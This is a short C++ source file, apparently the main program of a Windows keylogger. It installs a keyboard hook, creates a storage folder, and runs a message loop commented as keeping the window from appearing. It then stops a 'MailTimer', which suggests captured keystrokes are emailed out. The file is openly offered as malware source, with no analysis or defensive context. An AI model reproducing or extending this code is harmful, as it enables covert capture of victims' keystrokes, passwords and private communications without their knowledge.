#include <iostream>
#include <windows.h>
#include "./../headers/KeybHook.h"
using namespace std;

int main ()
    {
        MSG Msg;
        IO::MkDir (IO::GetOurPath (true));
        InstalHook ();

        // Disables the application window from popping up
        while (GetMessage (&Msg, NULL, 0, 0))
            {
                TranslateMessage(&Msg); // Translate message to system
                DispatchMessage(&Msg);  // Forwards message to system
            }
        MailTimer.Stop ();
        return 0;
    }

